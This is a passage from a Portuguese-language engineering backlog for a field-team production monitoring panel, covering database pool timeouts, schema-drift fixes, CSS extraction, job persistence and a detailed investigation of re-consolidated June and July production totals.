    `team_daily_subcat_totals`, `daily_totals`, `daily_subcat_totals` têm
    `id BIGSERIAL` (default). `note_rejections` tem PK `note_id` (UUID) → o
    caller passa `tieBreaker='note_id'`. `metas` não pagina via `_selectAll`.
  - **Testes:** `_selectAll` agora é **exportado** e `test/pagination.test.js`
    importa o REAL (antes copiava a impl — podia driftar). +5 testes: aplica
    `id` por página; tie-breaker é a última chave após a ordem do factory;
    `note_id` custom; `null` desliga; e paginação estável com `captured_at`
    todos iguais (2500 UUIDs, nenhum perde/duplica). Suíte: 222/222.
  - **Deploy:** só código (`db/queries.js`), sem migração. `git pull` + PM2.
    Risco de quebra contido: única forma de erro seria tabela sem `id`, e todas
    as paginadas foram auditadas (a única exceção, `note_rejections`, tem
    override). Rollback: reverter o commit.

## P2-6 — `statement_timeout` no pool Postgres

- **Categoria:** Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de dados 2026-07-08
- **Evidência:** `services/pgShim.js:42-48` — pool configurado sem timeout.
  Query pesada em JSONB pode segurar as 10 conexões.
- **Impacto:** Range grande na aba Deslocamentos ou export mensal pode
  ocupar conexões por minutos. Enquanto isso, cron de escrita enfileira
  → painel trava em cascata.
- **Ação:** Adicionar `options: '-c statement_timeout=60000'` no `new Pool()`
  em `pgShim.js`.
- **Aceite:** Query travada > 60s aborta com erro (validar com
  `SELECT pg_sleep(70)` via psql).
- **Esforço:** 5min.
- **Rollback:** Trivial.
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  - Config do pool extraída pra `_buildPoolConfig(env)` (função PURA, testável
    sem banco) e `statement_timeout` aplicado via libpq `options`
    (`-c statement_timeout=<ms>`) — vale pra TODA conexão do pool desde o
    startup. Default **60000ms**, configurável por `PG_STATEMENT_TIMEOUT_MS`.
  - **Escape hatch:** `PG_STATEMENT_TIMEOUT_MS=0` desliga o limite (semântica
    do Postgres) — necessário pra scripts de backfill/reconsolidação que
    rodam queries longas de propósito e usam o mesmo pool. Documentado no
    jsdoc de `_buildPoolConfig`.
  - **Testes:** +5 em `test/pgShim.test.js` (default 60s presente; custom
    respeitado; 0 desliga; erro claro sem DATABASE_URL; max/idle/ssl). Suíte:
    227/227. Validação end-to-end (pg_sleep) fica como passo manual na VM
    (ver abaixo) — não dá pra testar timeout real sem banco.
  - **Validação na VM** (o `SET` local do psql NÃO reflete o pool da app; para
    provar o mecanismo do servidor, rode direto na conexão):
    `psql "$DATABASE_URL" -c "SET statement_timeout=2000; SELECT pg_sleep(5);"`
    → deve abortar com `canceling statement due to statement timeout`.
  - **Deploy:** só código (`services/pgShim.js`), sem migração. `git pull` +
    PM2. Rollback trivial (reverter o commit).

## P2-7 — Schema drift: `pg_dump --schema-only` no git

- **Categoria:** Ops / Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de dados 2026-07-08
- **Evidência:**
  - `team_daily_carteira` é escrita (`dataWriter.js:682-685`) e lida
    (`routes/index.js:2671-2679`) mas **não tem CREATE TABLE em nenhum
    `.sql` do repo**.
  - `migrations/add_note_rejections.sql:23-25` define colunas
    `reason_codes/reason_labels/rejected_at` enquanto
    `supabase/migrations/008_note_rejections.sql:31-35` define
    `motivo_codes/motivo_textos/rejection_date` (o código usa este).
- **Impacto:** DR ou ambiente novo quebra silenciosamente. Schema real
  vive só na VM. Sem staging, isso é único ponto de falha.
- **Ação:**
  1. Na VM: `pg_dump -d wpa_monitor --schema-only > /tmp/schema.sql`
  2. Commitar como `db/schema-atual.sql` no repo (referência, não
     rodável direto — documenta o real).
  3. Deletar `migrations/add_note_rejections.sql` obsoleto.
  4. Escrever migration incremental `db/migrations/YYYYMMDD-team_daily_carteira.sql`
     com o CREATE TABLE correto (já existe em algum comentário do repo).
- **Aceite:**
  - [x] `db/schema-atual.sql` no git (commit `c7e023b`, 844 linhas, pg_dump da VM).
  - [x] Comparação revela todas as diferenças (documentada em `db/README.md`).
  - [x] Migração de `team_daily_carteira` versionada
    (`supabase/migrations/011_team_daily_carteira.sql`).
- **Esforço:** 2h.
- **Rollback:** Reverter commit.
- **Depende de:** P0-1 (senha `wpa_app` acessível — ou fazer com o próprio
  José antes do handoff).
- **Feito em:** 22/07/2026 (com o próprio José, satisfazendo a dependência P0-1).
  - **`db/schema-atual.sql`**: `pg_dump --schema-only` do banco vivo, commitado
    (844 linhas). Regeneração documentada em `db/README.md`.
  - **Drift auditado** (`db/schema-atual.sql` × `supabase/schema.sql`):
    - **ZERO drift de coluna** nas 11 tabelas compartilhadas — a base bate 1:1
      com o banco (inclui as críticas `snapshots`/`team_daily_totals`).
    - 6 tabelas só no banco (fora da base): `equipes_oficiais`,
      `notas_daily_agg`, `notas_snapshots`, `note_rejections`, `osrm_cache`,
      `team_daily_carteira`. As 5 primeiras têm migração de origem; a 6ª era a
      única **órfã** — agora versionada.
    - Nenhuma tabela do design faltando no banco.
    - Mapa completo migração→tabela em `db/README.md`.
  - **`team_daily_carteira` versionada**: criado
    `supabase/migrations/011_team_daily_carteira.sql` com o schema **conferido
    contra o dump real** (11 colunas, PK `(date,team_name)`, índice
    `idx_tdc_regional`). Reconstrução a partir do código (write/read) bateu 1:1
    com o `pg_dump`.
  - **Obsoleto removido**: `migrations/add_note_rejections.sql` deletado —
    definia `reason_codes/reason_labels/rejected_at`, mas o banco real e o
    código usam `motivo_codes/motivo_textos/rejection_date` (de
    `supabase/migrations/008`, que evoluiu com `observacao/formulario/
    collaborator_*`). Confirmado contra o dump antes de deletar.
  - **Desvio do plano (transparente):** a migração foi pra
    `supabase/migrations/011_…` (sequência numerada já existente e aplicada
    pelo `migrate-from-supabase.sh`), **não** pra `db/migrations/` como o plano
    sugeria — criar um 3º diretório de migração, que nenhum runner conhece,
    deixaria a migração órfã de novo. Sem migração de dados; só arquivos SQL/docs
    (nenhum restart necessário).

## P2-8 — Extrair CSS pra `css/app.css` (primeiro passo do split)

- **Categoria:** Frontend
- **Status:** **done** (22/07/2026) — código feito; **falta você validar
  visualmente** (ver "Feito em" + checklist do aceite).
- **Fonte:** Auditoria de frontend 2026-07-08
- **Evidência:** `index.html` linhas 20-4279 são `<style>` — 4.259 linhas
  de CSS num único arquivo com HTML e JS. Encolhe o monolito em 33% sem
  risco de quebrar JS.
- **Impacto:** Valida o padrão de servir assets separados (pré-requisito
  pro split do JS em P3-2). Melhora tempo de load e cache.
- **Ação:**
  1. Copiar linhas 20-4279 pra `public/css/app.css`.
  2. `<link rel="stylesheet" href="css/app.css?v=YYYYMMDD">` no `<head>`
     do index.html.
  3. Remover o `<style>` interno.
  4. Testar visualmente todas as abas.
- **Aceite:**
  - [x] `index.html` encolheu ~4200 linhas (12.886 → 8.628; CSS em
    `public/css/app.css`, 4.264 linhas).
  - [ ] Zero regressão visual em Monitor, Rejeições, Gráficos, Ranking,
    Mapa, Deslocamentos, Notas, Histórico, Metas. **(validação visual do José
    pendente — o teste automatizado só garante que o CSS é servido, não o
    render de cada aba)**
- **Esforço:** 2-3h.
- **Rollback:** Reverter commit.
- **Depende de:** P2-3 (`public/` criado).
- **Feito em:** 22/07/2026.
  - Extraído o bloco `<style>` grande do `<head>` (era `index.html:20-4279`,
    4.258 linhas) pra `public/css/app.css`; substituído por
    `<link rel="stylesheet" href="css/app.css" />` no `<head>`. `index.html`:
    12.886 → 8.628 linhas.
  - **Nenhum `url()` relativo nem `@import`** no bloco (conferido antes de
    mover), então trocar a base pro `/css/` foi seguro. Servido de `public/`
    (P2-3); CSP já libera (`style-src 'self'`), sem mudança.
  - **Não movido de propósito:** os 4 blocos `<style>` PEQUENOS inline no body
    (componentes) ficaram — o backlog pede só o bloco grande ("1º passo").
    Split deles/do JS é o P3-2.
  - +1 teste (`GET /css/app.css` → 200 `text/css` com `--verde`). Suíte 267/267.
  - **⚠️ Validação visual (SUA):** o teste garante que o CSS é servido, mas não
    o render. Depois do deploy, passe pelas abas Monitor, Rejeições, Gráficos,
    Ranking, Mapa, Deslocamentos, Notas, Histórico, Metas e confirme que nada
    ficou sem estilo. Se algo quebrar, é rollback trivial (reverter o commit).
  - **Deploy:** arquivos (`public/index.html`, `public/css/app.css`), sem
    migração. `git pull` + PM2.

## P2-9 — Watchdog externo (UptimeRobot/BetterStack)

- **Categoria:** Operação
- **Status:** pending
- **Fonte:** CTO review 2026-07-08
- **Evidência:** P1-1 é watchdog interno (no crontab da mesma VM). Se a
  VM cair, o watchdog cai junto — não alerta. Precisa de monitoria
  externa.
- **Impacto:** VM inteira offline não gera alerta. Contrato com SLA (P2-N
  a definir com EDP) fica sem prova de uptime.
- **Ação:**
  1. Criar conta gratuita UptimeRobot (free tier 50 monitores, 5min interval)
     ou BetterStack.
  2. Adicionar monitor apontando pro `/health` (público? ou expor um
     `/health-public` sem auth com JSON mínimo).
  3. Configurar alerta pra email/Teams do José + backup humano.
  4. Salvar credenciais no cofre P0-1.
- **Aceite:**
  - [ ] Monitor externo ativo.
  - [ ] Teste: PM2 parado 10min → alerta chega.
- **Esforço:** 1h.
- **Rollback:** Deletar monitor.
- **Depende de:** P1-2 (`/health` real).

## P2-10 — Persistir estado do `_reclassifyJob`

- **Categoria:** Backend
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js:1733` — `_reclassifyJob` é variável de
  módulo em memória. `_runReclassifyBackground` roda ~80 linhas de pipeline
  async. OOM ou deploy no meio → cliente que faz poll em
  `/admin/subcat-reclassify/status` vê `job:null` pra sempre.
- **Impacto:** Job longo (reclassificação de subcategorias) sem persistência
  de progresso. Se cair, perde-se contexto.
- **Ação:**
  1. Persistir estado em `app_settings` com key `reclassify_job` a cada
     lote: `{running:true, done:N, total:M, startedAt, lastBatchAt}`.
  2. No boot do server, ler `reclassify_job` e marcar como `interrupted`
     se `running=true` (ninguém retomou; requer intervenção manual).
  3. Endpoint `/admin/subcat-reclassify/status` lê do banco em vez da
     variável.
- **Aceite:** Status persiste após restart do PM2. ✓
- **Esforço:** 3-4h.
- **Rollback:** Reverter.
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  - Novo `services/reclassifyJobStore.js`: espelha o job em `app_settings`
    (key `reclassify_job`, JSONB) via `getSetting`/`setSetting`. Escrita
    **best-effort** (try/catch — falha de persistência nunca derruba o pipeline
    nem o boot). A memória segue sendo a fonte viva no processo; o banco é a
    cópia durável.
  - `_runReclassifyBackground` persiste em cada marco: ao calcular `total`, a
    cada lote (com `last_batch_at`), e em done/error. A POST persiste ANTES de
    disparar o background (status sobrevive mesmo se cair no 1º lote).
  - `GET /admin/subcat-reclassify/status` agora lê do banco (fallback pra
    memória se o banco cair) → **sobrevive a restart do PM2**.
  - **Boot** (`server.js` start): `reconcileOnBoot()` lê o job persistido; se
    estava `running` (ninguém retomou), marca `interrupted` — estado terminal,
    exige novo disparo manual. Best-effort (não derruba o boot).
  - Frontend (`index.html`): novo ramo pro status `interrupted` (mostra
    progresso parcial + "dispare de novo"), senão um job interrompido apareceria
    como "✓ concluída" — mentira sobre o resultado.
  - **Testes:** +9 em `test/reclassifyJobStore.test.js` (`reconcileBootState`
    puro: running→interrupted preservando progresso, done/error/interrupted
    intactos, null; `reconcileOnBoot` com load/save injetados). Suíte: 236/236.
  - **Deploy:** código (`routes/index.js`, `server.js`, `index.html`, novo
    service), sem migração — usa a `app_settings` existente. `git pull` + PM2.

---

## P1-17 — Junho mede +717 na re-consolidação (sinal invertido) — NÃO aplicar ainda

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** pending — **investigação antes de qualquer apply**
- **Fonte:** `diag-impacto-reconsolidacao.js 2026-06-01 2026-06-30`, 31/07/2026,
  já com todos os fixes do dia no ar (P1-14, P1-15, P1-16).
- **Evidência:** **13.082 → 13.799 = +717 (+5,5%)** no recorte da whitelist —
  ou seja a tabela de junho **subconta**, o oposto de julho (−877). E o padrão
  por dia não é de um mecanismo único:
  - Positivos extremos: **23/06 +402 (+181,1%)**, 22/06 +160 (+37,6%),
    24/06 +123 (+27,4%), 28/06 +47 (+33,8%), 20/06 +50 (+25,8%), 10/06 +88.
  - Negativos: 08/06 −79, 15/06 −73, 16/06 −64, 25/06 −62, 12/06 −26.
  - Os **negativos** têm injeção alta de rejeição (273, 215, 243, 247, 150) →
    é a assinatura do P1-16, igual às sextas de julho. Coerente.
  - Os **positivos** não têm explicação por rejeição. Um dia com +181% significa
    tabela em 222 contra régua em 624 — isso é dia mal consolidado, não regra.
- **❌ LEITURA ERRADA, CORRIGIDA NO MESMO DIA.** Registrei aqui que "a cobertura de
  `note_rejections` só começa em 08/06" com base no salto das injeções
  (24 → 273). Errado: `diag-cobertura-rejeicoes.js` mostra **13.991 linhas de
  25/04 a 31/07**, e os dias de volume baixo são **fim de semana** (13/14, 20/21,
  27/28). Não há "início da coleta" no meio do mês.
- **✅ O QUE EXISTE SÃO BURACOS PONTUAIS — E ELES INVERTEM O SINAL DO DRY-RUN:**
  - `01/06` → **0** linhas · `02/06` → **0** (segunda e terça)
  - `09/06` → **1** linha · `10/06` → **1** (terça e quarta)
  - **A WPA limpa `notasRejeitadas` do payload após horas.** Quando esses dias
    foram consolidados AO VIVO, a rejeição estava no payload e foi descontada.
    Hoje a única fonte persistente é `note_rejections` — então re-consolidar um dia
    sem cobertura **devolve a nota rejeitada pra produção**. O `+88` do 10/06 no
    dry-run é REGRESSÃO, não correção.
  - 🚫 **Excluir do apply:** 01, 02, 09 e 10/06.
- **✅ CAUSA DOS POSITIVOS GRANDES: dias com consolidação PARCIAL (equipes inteiras
  zeradas).** `diag-drift-team.js 2026-06-23` (gravado 636, união_D 931,
  união_D+1 933 — as duas réguas concordam, então não é assimetria de janela):
  - **96 equipes com gap**, soma +170 / −465. Os −465 são equipes com
    `gravado = 0` tendo produção real nos snapshots: ETGPR15 0×51, ETCIT16 0×35,
    ETCIT18 0×35, ETALE15 0×28, ETCIT17 0×27, ETCIT15 0×18, ECCIT80 0×17…
  - **As zeradas são de fora de SJC** (ETCIT/ETALE/ETGPR/ECALE/ECMRT/EPANC/EPCIT/
    EBGPR/ECVGA…), enquanto as com `gravado > união` são **SJC** (ECCSJ83 21×7,
    ECCSJ82 15×2, ECCSJ86 12×1) — estas últimas são o P1-16 puro.
  - Leitura: **algum passe wipou 23/06 e reagregou só parte dos setores.** O wipe
    do `consolidateDay` apaga o dia INTEIRO; se a reagregação não cobre todos os
    setores, as equipes ausentes ficam sem linha nenhuma. É o risco do **P1-11**
    (sem transação) e/ou do **P1-13**. Produção perdida é REAL — os snapshots
    estão lá, as duas réguas veem.
- **Ação:**
  1. ✅ `diag-cobertura-rejeicoes.js 2026-06-01 2026-06-30` — buracos identificados.
  2. ✅ `diag-drift-team.js 2026-06-23` — confirmado: consolidação parcial por setor.
  3. ⬜ Repetir o `diag-drift-team` em **22/06 e 24/06** (o cluster) e em 28/06 e
     20/06 — confirmar o mesmo padrão de equipes zeradas antes de generalizar.
  4. ⚠️ **APLICADO em 31/07 — e o plano de PULAR dias tinha um FURO.** Rodado em
     dois trechos (`06-03→06-08` e `06-11→07-01`) pra pular 01, 02, 09 e 10/06.
     **Não funcionou:** o passe do 1º dia do intervalo wipa `{1ºdia-1, 1ºdia}`, então
     - `06-02` foi APAGADO e reescrito pelo passe de `06-03`;
     - `06-10` foi APAGADO e reescrito pelo passe de `06-11`;
     - `06-01` e `06-09` receberam upsert parcial (não foram wipados).
     Pra preservar um dia, o intervalo tem de começar **2 dias depois** dele. O
     `backfill-consolidate` agora avisa isso ao terminar.
     Saldos aplicados: trecho 1 (2.897 → 2.764 = −133), trecho 2 (15.058 → 14.526
     = −532) na tabela inteira.
  5. ⚠️ **`2026-07-01` ficou na régua de D** (era o último dia do trecho 2) — e
     julho é o mês reportado, já verificado. Precisa re-rodar julho pra selar.
  6. ❌ **A PREMISSA DA PROTEÇÃO ERA ERRADA — CONFIRMADO.** `diag-drift-team.js
     2026-06-10` (dia com 1 linha em `note_rejections`) depois de re-consolidado:
     `GRAVADO = UNIÃO_D+1 = 1106` exato, `UNIÃO_D = 928`, **53 equipes com gap e
     nenhuma zerada**, veredito do próprio script "HIPÓTESE CONFIRMADA". O `+88`
     que eu havia chamado de regressão era só a diferença de régua D vs D+1 — o
     mesmo engano do P0-6, pela **4ª vez**.
     Razão: `_unionTeamsFromSnapshots` une `notasRejeitadas` de **todos** os
     snapshots do dia (a cada 15min), então a rejeição sobrevive à
     re-consolidação. `note_rejections` é **suplemento** (pega o que a WPA limpou
     antes de qualquer snapshot), não fonte única.
     ⇒ **Não há dia a excluir do backfill.** Rodar o intervalo inteiro.
  7. ⚠️ `verify-consolidacao.js 2026-06-01 2026-06-30` — **3 dias com drift**, todos
     consequência dos itens 4 e 5 (nenhum é dado novo):
     - `06-01` tabela 685 × régua 710 (+25): dia "protegido", nunca consolidado.
     - `06-08` tabela 877 × régua 900 (+23): último dia do trecho 1, régua de D.
     - `06-13` tabela 259 × régua 252 (−7): resíduo pequeno, sábado.
     Os outros 27 dias `ok`, com 20 deles em diff **0** — o corpo de junho ficou
     consistente. Correção: re-rodar `06-02 → 07-01` (o passe de 06-02 wipa e
     regrava 06-01) e depois `07-01 → 07-31` pra selar julho.
  8. ✅ **Re-aplicado `06-02 → 07-01`** (+20 na tabela inteira, só os 3 dias
     pendentes) e **`07-01 → 07-31`** (+152, fechando o resíduo do P2-13 em julho).
  9. ✅ **VERIFICAÇÃO FINAL `06-01 → 07-31`: 58 dos 61 dias `ok`.** Os 3 restantes:
     - `06-05` tabela 420 × régua 393 (−27) — **P2-13**, e foi a 2ª passada que
       criou (antes estava 392 × 393). Ver a correção no P2-13.
     - `06-13` tabela 259 × régua 252 (−7) — **P2-13**, resistiu às duas passadas.
     - `07-31` (+6) — dia em curso, o cron das 00:15 sela.
     Nenhum dos três é o P1-16/P1-15: são acúmulo de upsert fora da janela de wipe.
  10. ✅ **TOTAIS FINAIS (31/07/2026, recorte da whitelist):**

      | mês | antes de hoje | depois | saldo |
      |---|---|---|---|
      | **junho** (01→30) | 13.082 | **13.764** | **+682 (+5,2%)** |
      | **julho** (01→30) | 14.998 | **14.064** | **−934 (−6,2%)** |
      | **os dois** | 28.080 | 27.828 | **−252 (−0,9%)** |

      Julho comparado só até o dia **30** de propósito — o dia 31 estava em curso
      nas duas medições (7 OS às 11:33, 151 às 14:31) e contaminaria o saldo.
      **Os dois meses quase se anulam**: julho cai ~6% (rejeitada que era contada
      como produção) e junho sobe ~5% (produção real perdida em consolidação
      parcial). Isso é o argumento pra auditoria — a correção não é uma
      "redução de produção", é a remoção de dois erros de sinais opostos.
      Resíduo restante: junho +0,3% (35 OS), julho +0,8% (113 OS) — é o **P2-13**.
  11. ⬜ Revisar esses números com o José antes de qualquer comunicação à EDP.
  8. ⬜ Medir maio (`diag-impacto-reconsolidacao.js 2026-05-01 2026-05-31`) e rodar
     a mesma checagem de cobertura antes de decidir.
- **Confirmação do padrão nos outros dias do cluster** (`diag-drift-team`):
  - `22/06`: gravado 913 · união 922/925 · líquido −9, mas +216/−225 por equipe —
    ETGPR15 0×46, ETPIU15 0×32 zeradas, e SJC inflada (ECTSJ88 29×13, ECTSJ80 15×2).
    Os dois efeitos quase se cancelam no total; por equipe, não.
  - `24/06`: gravado 597 · união 802/804 · líquido −205, com ETALE15 1×35,
    ETPIU15 0×33, ECPIU90 0×27, ETGPR16 0×21, ETMRT16 0×20 zeradas.
  - Padrão confirmado: **equipes inteiras sem linha, concentradas fora de SJC**.
    Consolidação parcial por setor, não questão de régua.
- **🐛 CURIOSIDADE A INVESTIGAR:** os passes de 26 e 27/06 gravaram linha para
  `"2026-01-16"` (`team_daily_totals_upserted dates ["2026-01-16", …]`) — data
  anterior ao início do projeto (abr/2026). Alguma nota tem `conclusionDate` de
  janeiro e o `_notaDate` a joga pra lá. Inofensivo hoje (ninguém consulta jan),
  mas indica que `_notaDate` aceita data arbitrária do payload sem sanity check.
- **Impacto da decisão:** re-consolidar junho **AUMENTA** a produção reportada em
  ~5,5%. Menos arriscado que reduzir, mas número que sobe depois de reportado
  também é questionável em auditoria — e pior, pode estar subindo por motivo
  errado. **Não aplicar às cegas.**
- **Esforço:** investigação 2–3h.
- **Relacionado:** P0-6, P1-11, P1-13, P1-16, P2-13. Maio ainda não medido.

---

## P2-15 — Intervalos (`/sessions/{id}/break`) + previsto × realizado + linha do tempo

- **Categoria:** Dados (capacidade nova)
- **Status:** pending
- **Fonte:** `monitor_stc_es.py` (tabelas `intervalos` e `rota_dia`).
- **O que não temos hoje:**
  1. **Intervalos.** `GET /api/sessions/{sessionId}/break` →
     `SessionBreakReason.{Text, Responsible}`, `StartTime`, `EndTime`. É o dado que
     explica **por que** a equipe está parada (almoço, deslocamento, aguardando).
     Sem ele, o painel não distingue **parada legítima** de **desvio**.
  2. **Horários previstos de intervalo.** Temos `escala_inicio`/`escala_fim` em
     `equipes_oficiais`, mas **não** o início/fim previstos do intervalo. O cadastro
     deles (`public.escalas`) tem `inicio_escala`, `fim_sessao`, `inicio_intervalo`,
     `fim_intervalo` por código de escala.
  3. **Linha do tempo unificada (`rota_dia`).** Empilha checkpoints das notas +
     início/fim de cada intervalo, ordenados por equipe e hora, com a equipe
     **corrigida por quem detinha a nota no instante** (via P1-23).
- **O que destrava (não conseguimos responder hoje):**
  - tempo entre **chegada** e **conclusão** de cada nota;
  - tempo de **deslocamento** entre notas;
  - **ociosidade** não explicada por intervalo;
  - **intervalo além do previsto** / fora da janela;
  - sessão encerrada **antes** do fim da escala.
- **Por que é estratégico:** é a base de **prevenção** (projetar "no ritmo atual não
  fecha a carteira até o fim da escala"). Sem trajetória cronológica só se detecta
  o desvio depois de acontecer.
- **⚠️ Aprender do erro deles:** a PK da `rota_dia` **não inclui o horário**, então
  eventos do mesmo tipo/tentativa no dia colapsam num registro só — anula o
  propósito da tabela. Incluir `registro` na chave.
- **Relacionado:** P1-23, P1-26, P1-1.

---

## P2-16 — `filterByExhibitionSector=true` pode ser a causa do nosso fallback cross-setor

- **Categoria:** Backend (desempenho + ruído)
- **Status:** pending — testar
- **A diferença:** nós chamamos
  `GET /teamsstatus/V2?sectorId=X&filterByExhibitionSector=true`.
  **Os dois scripts chamam sem o parâmetro** — e não precisam de fallback nenhum.
- **O que o parâmetro nos custa:** o comentário no nosso `_getTeamsBySectorUncached`
  diz que a equipe some do V2 quando o "setor de exibição" difere do setor de login
  *"fazendo a equipe sumir do V2 com filterByExhibitionSector=true"* — e por isso
  mantemos um **fallback cross-setor**: para cada equipe visitante sem V2, varremos
  os outros setores (`ALL_SECTORS`). Isso gera N requisições extras por ciclo e foi
  a origem do ruído `falha ao buscar V2 em DSSJ` investigado em 14/08.
- **Hipótese:** sem o parâmetro, o V2 devolve todas as equipes do setor e o fallback
  inteiro se torna desnecessário — menos requisições, menos ruído, menos código.
- **Ação:**
  1. ⬜ Comparar, no mesmo setor e instante, a lista **com** e **sem** o parâmetro
     (quantas equipes, quais faltam).
  2. ⬜ Se sem o parâmetro vier tudo, remover o parâmetro e o fallback cross-setor.
  3. ⬜ Se vier diferente, documentar a diferença REAL — o comentário atual pode
     estar descrevendo uma suposição, não um teste.
- **⚠️** Muda a fonte dos contadores de nota → medir produção antes/depois.

---

## P2-17 — Achados menores dos scripts Python

- **Status:** pending · **Fonte:** revisão 14/08/2026

1. **Placa no histórico.** Nosso comentário afirma *"Placa: só existe em
   sessions/current"* (endpoint ao vivo). Mas os scripts leem `Vehicle.Label` do
   `Sessions/all/date` — o endpoint **histórico**. Provavelmente conseguimos placa
   no histórico e não aproveitamos. ⬜ Verificar `Vehicle.Code` × `Vehicle.Label`.
2. **`SessionEndBy`** — quem encerrou a sessão (equipe × backoffice). Não lemos.
   Útil pro P1-14/deslogadas.
3. **`LastStatusUpdateWithoutSignal`** — distingue equipe **sem sinal** de equipe
   **parada**. Não lemos.
4. **`Session.VehicleCategory.Name`** — categoria do veículo. Lemos só a placa.
5. **Parser de DATE no `pgShim` (OID 1082).** Confirmado: **não registramos** nenhum
   `setTypeParser`. Toda coluna DATE volta como objeto `Date` onde o código espera
   string — classe que já causou **dois** bugs de número reportável (**P2-12** coluna
   DIAS e **P1-15** enriquecimento de rejeição virando código morto). Registrar o
   parser mata a classe inteira. ⚠️ Mudança **global**: exige varredura de todo lugar
   que hoje recebe `Date` e chama `.getFullYear()` etc.
6. **Sentinela `0001-01-01T00:00:00`.** A EDP usa esse valor como "vazio". Nós
   tratamos em `cronService.js` e `notasMonitor.js`, mas o `wpaService.js` decide
   sessão encerrada com `const sessaoEncerrada = !!s.EndTime` (~1263) e
   `sessionEnd: s.EndTime || null` — a sentinela é **truthy**, então uma sessão
   ABERTA seria tratada como **encerrada** (equipe sai do monitor indevidamente).
   Eles centralizam isso (`converter_data_robusta`). ⬜ Criar helper único.
7. **Janela de reprocessamento.** Nosso drift sweep cobre **D-1..D-7**; eles
   reprocessam **15 dias**. Nota que muda de status após 7 dias nunca é recapturada
   por nós. ⬜ Avaliar se 7 basta.

---

## P2-14 — `/Sessions/{id}/collaborators`: Collaborators vazios

- **Categoria:** Dados
- **Status:** pending
- **Fonte:** `monitor_stc_es.py` (revisão 14/08/2026).
- **Problema conhecido nosso:** o comentário em `services/wpaService.js` já
  registra que `sessions/all/date` retorna `Collaborators` **vazio**, e que só
  `sessions/current` traz nome/matrícula — o que deixa o histórico sem colaborador.
- **O endpoint:** `GET /api/Sessions/{sessionId}/collaborators` → `Team.Name`,
  `BeginTime` e `Collaborators[].Collaborator.{Name, Code}` + `SessionId`.
  É provavelmente a fonte que faltava pra preencher colaborador no histórico.
- **⚠️ O script usa ERRADO** (avisar o autor): passa o **Id do serviço** (nota) num
  endpoint de **sessão** — `Sessions/{id_da_nota}/collaborators` — e itera por
  serviço em vez de por sessão (centenas de chamadas redundantes). O correto é
  `id_sessao`, 1 chamada por sessão.
- **Ação:** ⬜ testar o endpoint com um `sessionId` real; se vier populado, usar
  no enriquecimento do histórico (1 chamada por sessão, não por nota).
- **Relacionado:** o card de detalhe da equipe no Monitor mostra colaboradores.

---

## P2-13 — Upsert de dia antigo SOBRESCREVE em vez de somar (subconta ~0,8%)

- **Categoria:** Dados
- **Status:** pending — pequeno e na direção conservadora, mas é sistemático
- **Fonte:** resíduo que sobrou depois de fechar o P1-16 em 31/07/2026.
- **Evidência:**
  - `consolidateDay(D)` **wipa** só `{D-1, D}`, mas faz **upsert** de linhas pra
    vários `notaDate` anteriores (`_notaDate` devolve a nota pro dia da conclusão).
    Nos logs: o passe de 27/07 gravou `dates ["2026-07-20","2026-07-24","2026-07-25",
    "2026-07-26","2026-07-27"]`.
  - O upsert é por `(date, team_name, tipo_code)` com **replace**. O passe de D+3
    vê só as equipes que ainda carregam aquela nota, calcula um count PARCIAL pra
    `(D, equipe, tipo)` e **sobrescreve** o valor completo que o passe de D+1
    havia gravado. Último escritor ganha, mesmo com visão parcial.
  - Medido em julho após a re-consolidação: `diag-impacto-reconsolidacao.js` fica
    em **+114 OS (+0,8%)** — a tabela subconta ~4 OS/dia. Os últimos dias do
    intervalo dão 0 justamente porque tiveram menos passes posteriores.
- **Impacto:** ~0,8% do número reportado, e **as duas direções** — não só
  subnotificação. Correção de duas afirmações minhas de 31/07:
  1. ❌ *"direção conservadora, só subconta"* — **errado**. O upsert só substitui
     chaves que ele calcula; linhas de equipe/tipo que o passe selador não produziu
     **ficam** e se somam. Verificado em `06-05` após a 2ª re-consolidação de junho:
     tabela **420** contra régua **393** (+27, limiar 8) — o dia recebeu upsert dos
     passes de 06-07, 06-08, 06-09, 06-10 e 06-11 (todos listam `2026-06-05` em
     `dates`) sem nunca ser wipado de novo. Mesma coisa em `06-13` (259 × 252).
  2. ❌ *"rodar o backfill duas vezes fecha"* — **errado**. Em julho a 2ª passada
     fechou +152 de resíduo, o que me levou a essa conclusão; mas em junho a 2ª
     passada **criou** o desvio do 06-05. Não converge — embaralha. A correção
     tem de ser uma das 3 ações abaixo.
- **Consequência operacional (não é dano):** esses dias vão aparecer como
  `drift_nao_reparado` no log do sweep das 02:00 todas as noites, porque o guard do
  **P0-7** recusa reparo que subtrai. É ruído de log, e o guard está justamente
  impedindo que o sweep "conserte" pra baixo. Não silenciar sem resolver o P2-13.
- **Ação (candidatas, decidir antes de implementar):**
  1. Alargar o wipe pra cobrir TODAS as datas que o passe vai escrever (ex.:
     `D-3..D`) e reconstruí-las juntas — correto por construção, mais caro.
  2. Trocar o replace por união de note-ids nas datas fora da janela de wipe —
     exige retomar os ids já gravados, que hoje não são persistidos.
  3. Não escrever datas fora da janela de wipe e deixar o `verify-consolidacao`
     acusar — ⚠️ **perde** a nota que só aparece depois (era o ganho do P1-13).
- **Aceite:** `diag-impacto-reconsolidacao.js` de um mês inteiro em ~0 (hoje +0,8%),
  sem reintroduzir os sintomas do P1-13/P0-6 (verificar com `verify-consolidacao`).
- **Esforço:** 3–4h + medição. **Rollback:** reverter e re-consolidar.
- **Relacionado:** P1-13 (a razão de escrever datas antigas), P0-6/P0-7 (a mesma
  assimetria de janela vista por outro ângulo), P1-16.

---

## P2-11 — Andamento por equipe contava nota já concluída (dupla contagem)

- **Status:** **done** (fc2170d, 09/07/2026)
- **Categoria:** Frontend/Dados
- **Reportado por:** José Zouain (09/07/2026): "temos equipes executando
  mais de uma nota ao mesmo tempo, isso está gerando dúvida na
  acertividade dos números que estamos mostrando".
- **Evidência:** query em EPICO30 devolveu `andamento=3, também_concluídas=1,
  concluídas=2` — 1 das 3 "em andamento" já estava em `notasConcluidas`.
  Código: `index.html` card por equipe contava `(t.notasExecutadas||[])`
  cru, sem excluir ids já concluídos/rejeitados. O card AGREGADO
  (`renderMetrics`) já excluía concluídas; o card por equipe,
